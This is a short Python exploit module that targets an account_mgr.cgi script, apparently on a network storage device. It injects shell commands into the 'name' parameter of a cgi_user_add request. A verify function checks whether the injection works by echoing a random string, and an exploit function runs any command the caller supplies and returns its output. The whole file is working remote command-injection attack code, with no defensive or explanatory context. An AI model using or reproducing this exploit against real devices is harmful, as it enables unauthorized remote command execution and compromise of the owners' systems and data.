import random
import requests
import string

from urllib.parse import quote_plus


def verify(url: str, session: requests.Session) -> bool:
    verify_string = ''.join(random.choices(string.ascii_uppercase, k=5))
    
    cmd = quote_plus(f"echo {verify_string}")
    endpoint = f"{url}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;{cmd};%27"

    try:
        response = session.get(endpoint)
        response.raise_for_status()
    except requests.RequestException:
        return False

    body = response.text
    if verify_string in body:
        return True
    else:
        return False


def exploit(url: str, session: requests.Session, command: str) -> str:
        endpoint = f"{url}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;{quote_plus(command)};%27"

        try:
            response = session.get(endpoint)
            response.raise_for_status()
        except requests.RequestException as e:
            return f"uh oh: {e}"

        if not response.text:
            return "uh."
        else:
            return response.text